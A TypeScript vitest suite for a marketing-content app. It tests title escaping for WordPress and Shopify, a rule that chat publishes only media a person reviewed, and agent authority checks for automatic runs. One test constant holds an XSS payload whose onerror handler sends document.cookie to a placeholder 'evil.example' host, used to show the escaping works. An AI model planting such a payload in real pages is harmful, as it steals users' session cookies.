import { afterEach, describe, expect, it, vi } from "vitest";
import { randomBytes } from "crypto";
import { newUser, signIn } from "./helpers/session";
import { claudeOn } from "./helpers/model";
import { fakeAdapter, fakeDeps, mediaEnv, noNetwork, resetMediaCounters } from "./helpers/media";
import { currentUser, getUser, type User } from "@/lib/auth";
import { getTask, saveTask, type Task } from "@/lib/brand";
import { saveConnection, type Connection } from "@/lib/connectors/store";
import { escapeTitle, plainTitle, splitTitle } from "@/lib/connectors/publish";
import { publishShopifyArticle } from "@/lib/connectors/shopify";
import { PUBLISH_READ_MARGIN_MS, personSawCurrent, taskVersion, type MediaStamped } from "@/lib/task-version";
import { runTool } from "@/lib/chat";
import { startMedia } from "@/lib/media/jobs";
import type { StartInput } from "@/lib/media/types";
import { autoBlock, autoItems, createHandoff, getHandoff, markShown } from "@/lib/handoffs";
import { getGov, saveGov } from "@/lib/governance";
import { agentForTask } from "@/lib/agents";
import { db } from "@/lib/db";

/**
 * Engine review of 2026-10-22 (rules 3010-3019, docs/system/tests/3010-engine-review.md):
 * 3010 a blog title is model text and never reaches a site as a tag; 3012 chat never publishes media nobody saw, even
 * on an item published before; 3014 Majed's auto-run never starts an item whose agent may not create content on its
 * own; 3015 the person-started spends (a handoff Run, MCP `generate_content`) stay outside the tool authority, as documented.
 */

// The chat tool's publish goes nowhere: the item ids that would have gone out are recorded.
const sentOut: string[] = [];
vi.mock("@/lib/connectors/publish", async (orig) => ({ ...(await orig<typeof import("@/lib/connectors/publish")>()), publishTask: async (_e: string, t: Task, provider: string) => { sentOut.push(t.id); return { provider, url: "https://t.me/x/1", status: "published" as const }; } }));

const realFetch = globalThis.fetch;
afterEach(() => {
  globalThis.fetch = realFetch;
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

const PLANTED = `Offer <img src=x onerror="fetch('//evil.example/'+document.cookie)">`;

describe("rule 3010: a post title is model text and never reaches a site as a tag", () => {
  it("escapeTitle encodes the five HTML characters, for WordPress, whose title field is HTML", () => {
    expect(escapeTitle(PLANTED)).toBe("Offer &lt;img src=x onerror=&quot;fetch(&#39;//evil.example/&#39;+document.cookie)&quot;&gt;");
    expect(escapeTitle("Tom & Jerry's \"best\" <deal>")).toBe("Tom &amp; Jerry&#39;s &quot;best&quot; &lt;deal&gt;");
    expect(escapeTitle("دليل العود")).toBe("دليل العود");
    // The H1 a planted page put in the draft is exactly what reaches the helper.
    expect(escapeTitle(splitTitle(`# ${PLANTED}\nنص`, "x").title)).not.toMatch(/[<>"']/);
  });
  it("plainTitle keeps a plain-text title readable and tagless, for Shopify, whose themes escape it themselves", () => {
    expect(plainTitle(PLANTED)).toBe(`Offer ‹img src=x onerror="fetch('//evil.example/'+document.cookie)"›`);
    expect(plainTitle("Mother's Day & more")).toBe("Mother's Day & more");
  });
  it("the Shopify article is created with the title made tagless", async () => {
    const sent: Record<string, unknown>[] = [];
    globalThis.fetch = vi.fn(async (_input: RequestInfo | URL, init?: RequestInit) => {
      const body = JSON.parse(String(init?.body ?? "{}")) as { query: string; variables: Record<string, unknown> };
      if (body.query.includes("query Blog")) return Response.json({ data: { shop: { name: "Shop" }, blogs: { nodes: [{ id: "gid://shopify/Blog/7", handle: "news" }] } } });
      if (body.query.includes("mutation Article")) { sent.push(body.variables.article as Record<string, unknown>); return Response.json({ data: { articleCreate: { article: { id: "gid://shopify/Article/9", handle: "a" }, userErrors: [] } } }); }
      return new Response("not mocked", { status: 500 });
    }) as typeof fetch;
    const c: Connection = { provider: "shopify", data: { access_token: "shpat" }, meta: { shop: "ward.myshopify.com" }, connectedAt: new Date().toISOString() };
    await publishShopifyArticle(c, { title: PLANTED, body: "نص" });
    expect(sent[0].title).toBe(plainTitle(PLANTED));
    expect(String(sent[0].title)).not.toMatch(/[<>]/);
  });
});

const iso = (ms: number) => new Date(ms).toISOString();
let n = 0;
const item = (over: Partial<Task> & MediaStamped = {}): Task => ({ id: `er${++n}${randomBytes(3).toString("hex")}`, type: "social", channel: "instagram", title: "Weekend", body: "Two for one this weekend.", status: "approved", createdAt: new Date().toISOString(), lang: "ar", ...over });

describe("rule 3012: chat publishes only media a person saw", () => {
  it("personSawCurrent: without a stamp as before; with one, only a later decision or a publish well after it", () => {
    const now = Date.now();
    expect(personSawCurrent({ decidedAt: iso(now) })).toBe(true);
    expect(personSawCurrent({ published: [{ at: iso(now) }] })).toBe(true);
    expect(personSawCurrent({})).toBe(false);
    const media = now - 3_600_000;
    const stamped = { mediaAt: iso(media) };
    // Approved and published to Facebook before the re-render: nobody saw the new image.
    expect(personSawCurrent({ ...stamped, decidedAt: iso(media - 60_000), published: [{ at: iso(media - 30_000) }] })).toBe(false);
    // A decision after it: seen (an approval is bound to the card's version, image included).
    expect(personSawCurrent({ ...stamped, decidedAt: iso(media + 1) })).toBe(true);
    // A publish recorded during the seconds after the media may have read the older image: not counted.
    expect(personSawCurrent({ ...stamped, published: [{ at: iso(media + PUBLISH_READ_MARGIN_MS) }] })).toBe(false);
    expect(personSawCurrent({ ...stamped, published: [{ at: iso(media + PUBLISH_READ_MARGIN_MS + 1) }] })).toBe(true);
    // A stamp that does not parse is unseen.
    expect(personSawCurrent({ mediaAt: "nonsense", decidedAt: iso(now) })).toBe(false);
  });

  it("a render that lands on a published item stamps it; the chat then refuses it, and a person's approval lets it go", async () => {
    const net = noNetwork();
    try {
      resetMediaCounters();
      mediaEnv({ fal: true, kie: true, higgsfield: true, store: true, models: "all" });
      vi.spyOn(console, "error").mockImplementation(() => {});
      const u = await newUser("er-media");
      const decided = iso(Date.now() - 7_200_000);
      const t = item({ decidedAt: decided, published: [{ provider: "facebook", url: "https://facebook.com/p/1", status: "published", at: iso(Date.now() - 3_600_000) }] });
      await saveTask(u.email, t, true);
      const input: StartInput = { scope: u.email, email: u.email, lang: u.lang, accountSince: u.createdAt, plan: "pro", balance: u.credits, agent: "noor", taskId: t.id, model: "img-fast", aspect: "square", deadline: Date.now() + 100_000, prompt: async () => "a test prompt" };
      const r = await startMedia(input, fakeDeps({ fal: fakeAdapter("fal") }));
      expect(r.ok).toBe(true);
      const after = (await getTask(u.email, t.id)) as Task & MediaStamped;
      expect(after.imageUrl).toBeTruthy();
      expect(after.decidedAt, "rule 576 keeps a published item's record").toBe(decided);
      expect(typeof after.mediaAt).toBe("string");
      expect(personSawCurrent(after)).toBe(false);
      expect(net.hosts).toEqual([]);
    } finally {
      net.restore();
    }
  });

  it("publish_item refuses an item whose image arrived after its approval and publish, publishes it after a new approval, and an unstamped item as before", async () => {
    const u0 = await newUser("er-chat");
    await saveConnection(u0.email, { provider: "telegram", data: { token: "t", chat: "c" }, connectedAt: new Date().toISOString() });
    await signIn(u0.email);
    const u = (await currentUser())!;
    const media = Date.now() - 60_000;
    const stale = item({ id: "stale", channel: "telegram", decidedAt: iso(media - 3_600_000), published: [{ provider: "facebook", url: "https://facebook.com/p/1", status: "published", at: iso(media - 1_800_000) }], mediaAt: iso(media) });
    const legacy = item({ id: "legacy", channel: "telegram", published: [{ provider: "facebook", url: "https://facebook.com/p/2", status: "published", at: iso(media) }] });
    await Promise.all([saveTask(u.email, stale, true), saveTask(u.email, legacy, true)]);
    sentOut.length = 0;
    const out = await runTool(u, "publish_item", { task_id: "stale", provider: "telegram" }, []);
    expect(out).toMatch(/new image or video arrived on this item after the owner last approved or published it/);
    expect(sentOut).toEqual([]);
    expect((await getTask(u.email, "stale"))!.published).toHaveLength(1);
    // Before rule 3012 there was no stamp: an item a person published once still goes out from chat, as before.
    expect(await runTool(u, "publish_item", { task_id: "legacy", provider: "telegram" }, [])).toMatch(/Published/);
    // The owner reopens and approves it in the inbox: a decision after the media.
    await saveTask(u.email, { ...(await getTask(u.email, "stale"))!, decidedAt: new Date().toISOString() });
    expect(await runTool(u, "publish_item", { task_id: "stale", provider: "telegram" }, [])).toMatch(/Published/);
    expect(sentOut).toEqual(["legacy", "stale"]);
  });

  it("the version bound under the publish lock covers the image, as the inbox route's does", () => {
    const t = item({ imageUrl: "/api/media/f/a.png", imageProvider: "fal" });
    expect(taskVersion(t)).not.toBe(taskVersion({ ...t, imageUrl: "/api/media/f/b.png" }));
  });
});

const PRD = agentForTask("prd").id;
const G = (policy?: Record<string, Record<string, "off" | "ask">>) => ({ majedAutoHandoff: true, agentCaps: { [PRD]: 20 }, ...(policy ? { toolPolicy: policy } : {}) });
const CONV = "abc123def456";

async function proposal(prefix: string): Promise<{ u: User; id: string }> {
  const u = await newUser(prefix);
  await db.set(`conv:${u.email}:${CONV}`, { id: CONV, title: "t", createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), count: 2, agent: "majed" });
  await saveGov(u.email, { majedAutoHandoff: true, agentCaps: { [PRD]: 20 } });
  const h = await createHandoff(u.email, { proposal: { items: [{ type: "prd", brief: "مواصفة لصفحة الاشتراك" }] }, requestedBy: { kind: "owner", email: u.email }, origin: "web_chat", conv: CONV, ownerMsg: "m" });
  expect(await markShown(u.email, h.id)).toBe(true);
  return { u: (await getUser(u.email))!, id: h.id };
}

describe("rule 3014: Majed's auto-run honours the item's agent's produce authority", () => {
  it("autoBlock: off and ask-first are `authority`; on, a missing policy and another agent's switch are not", async () => {
    const { u, id } = await proposal("er-auto-pure");
    const h = (await getHandoff(u.email, id))!;
    expect(autoBlock(h, 0, G())).toBeNull();
    expect(autoBlock(h, 0, G({ [PRD]: { produce: "off" } }))).toBe("authority");
    expect(autoBlock(h, 0, G({ [PRD]: { produce: "ask" } }))).toBe("authority");
    expect(autoBlock(h, 0, G({ [PRD]: { images: "off" } }))).toBeNull();
    expect(autoBlock(h, 0, G({ noor: { produce: "off" } }))).toBeNull();
    // Majed's reply and card read the same rule: an off agent's item is never announced as starting by itself.
    expect(autoItems(h, G({ [PRD]: { produce: "off" } }))).toEqual([]);
  });

  it("the cron's run reads the setting again under the lock: skipped, nothing charged, the item left for the owner", async () => {
    const { u, id } = await proposal("er-auto-run");
    for (const mode of ["off", "ask"] as const) {
      await saveGov(u.email, { toolPolicy: { [PRD]: { produce: mode } } });
      expect((await getGov(u.email)).toolPolicy).toEqual({ [PRD]: { produce: mode } });
      vi.resetModules();
      vi.stubEnv("ANTHROPIC_API_KEY", "test");
      claudeOn();
      // No model may be reached: the SDK refuses to be built.
      vi.doMock("@anthropic-ai/sdk", () => ({ default: class { constructor() { throw new Error("no model call expected"); } } }));
      const { autoRunHandoff, autoQueue } = await import("@/lib/handoff-auto");
      expect(await autoRunHandoff(u, id, 0, Date.now() + 300_000)).toBe("skip:authority");
      expect(await autoQueue(u.email, await getGov(u.email))).toEqual([]);
      expect((await getUser(u.email))!.credits).toBe(u.credits);
      expect((await getHandoff(u.email, id))!.items[0].status).toBe("proposed");
      vi.doUnmock("@anthropic-ai/sdk");
      vi.doUnmock("@/lib/model");
    }
  });
});
